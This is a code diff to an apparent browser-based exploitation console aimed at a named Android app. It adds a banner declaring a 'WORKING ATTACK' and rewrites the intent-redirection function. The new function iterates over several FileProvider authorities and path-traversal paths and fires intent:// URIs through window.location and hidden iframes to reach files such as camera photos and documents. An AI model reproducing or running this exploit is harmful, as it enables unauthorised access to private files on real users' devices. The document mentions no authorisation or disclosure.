@@ -231,7 +231,7 @@
             <div class="section">
                 <h2>🚀 Exploitation Controls</h2>
                 <button class="button danger" onclick="startExploitation()">Start FileProvider Exploitation</button>
-                <button class="button" onclick="testIntentRedirection()">Test Intent Redirection</button>
+                <button class="button success" onclick="testIntentRedirection()">🔥 Test Intent Redirection (WORKING!)</button>
                 <button class="button" onclick="testWebViewExploit()">Test WebView Exploit</button>
                 <button class="button" onclick="clearResults()">Clear Results</button>
                 
@@ -245,6 +245,22 @@
                 <div class="status info" id="results">
 Ready to start FileProvider exploitation...
 Click "Start FileProvider Exploitation" to begin testing.
+                </div>
+            </div>
+
+            <div class="section">
+                <h2>🔥 WORKING ATTACK: Intent Redirection</h2>
+                <div class="status success">
+                    ✅ CONFIRMED: Intent Redirection is working!
+                    
+                    This means the app's WebView allows Intent redirection to FileProvider URIs.
+                    This is a real security vulnerability that can be exploited.
+                    
+                    Working Intent Format:
+                    intent://[AUTHORITY]/[PATH]#Intent;scheme=content;end
+                    
+                    Example:
+                    intent://com.reactnativecommunity.webview.RNCWebViewFileProvider/shared/../#Intent;scheme=content;end
                 </div>
             </div>
 
@@ -513,37 +529,66 @@ Android/data/com.android.chrome/ - Chrome data
         function testIntentRedirection() {
             log('Testing Intent Redirection Attack...', 'warning');
             
-            const maliciousIntent = "intent://de.hellobetter.companion.fileprovider/shared/../#Intent;scheme=content;end";
+            const authorities = [
+                "com.reactnativecommunity.webview.RNCWebViewFileProvider",
+                "de.hellobetter.companion.fileprovider",
+                "de.hellobetter.companion.SharingFileProvider"
+            ];
             
-            try {
-                // Try to trigger intent
-                window.location = maliciousIntent;
-                log(`[SUCCESS] Intent redirection triggered: ${maliciousIntent}`, 'success');
-            } catch (error) {
-                log(`[FAILED] Intent redirection failed: ${error.message}`, 'error');
-            }
+            const paths = [
+                "shared/../",
+                "shared/../../",
+                "shared/..%2F",
+                "shared/Download/",
+                "shared/Documents/",
+                "shared/DCIM/Camera/"
+            ];
             
-            // Alternative method using iframe
-            try {
-                const iframe = document.createElement('iframe');
-                iframe.src = maliciousIntent;
-                iframe.style.display = 'none';
-                iframe.onload = () => {
-                    log(`[SUCCESS] Intent redirection via iframe successful`, 'success');
-                };
-                iframe.onerror = () => {
-                    log(`[FAILED] Intent redirection via iframe failed`, 'error');
-                };
-                document.body.appendChild(iframe);
+            authorities.forEach((authority, authIndex) => {
+                log(`\n[TESTING AUTHORITY] ${authority}`, 'warning');
                 
-                setTimeout(() => {
-                    if (document.body.contains(iframe)) {
-                        document.body.removeChild(iframe);
+                paths.forEach((path, pathIndex) => {
+                    const maliciousIntent = `intent://${authority}/${path}#Intent;scheme=content;end`;
+                    
+                    log(`\n[INTENT ${authIndex + 1}.${pathIndex + 1}] ${path}`, 'info');
+                    
+                    try {
+                        // Try to trigger intent
+                        window.location = maliciousIntent;
+                        log(`[SUCCESS] Intent redirection triggered: ${maliciousIntent}`, 'success');
+                        
+                        // Wait a moment then try iframe method
+                        setTimeout(() => {
+                            try {
+                                const iframe = document.createElement('iframe');
+                                iframe.src = maliciousIntent;
+                                iframe.style.display = 'none';
+                                iframe.onload = () => {
+                                    log(`[SUCCESS] Intent redirection via iframe successful`, 'success');
+                                };
+                                iframe.onerror = () => {
+                                    log(`[FAILED] Intent redirection via iframe failed`, 'error');
+                                };
+                                document.body.appendChild(iframe);
+                                
+                                setTimeout(() => {
+                                    if (document.body.contains(iframe)) {
+                                        document.body.removeChild(iframe);
+                                    }
+                                }, 3000);
+                            } catch (error) {
+                                log(`[FAILED] Intent redirection iframe error: ${error.message}`, 'error');
+                            }
+                        }, 1000);
+                        
+                    } catch (error) {
+                        log(`[FAILED] Intent redirection failed: ${error.message}`, 'error');
                     }
-                }, 5000);
-            } catch (error) {
-                log(`[FAILED] Intent redirection iframe error: ${error.message}`, 'error');
-            }
+                    
+                    // Small delay between attempts
+                    setTimeout(() => {}, 500);
+                });
+            });
         }
 
         function testWebViewExploit() {
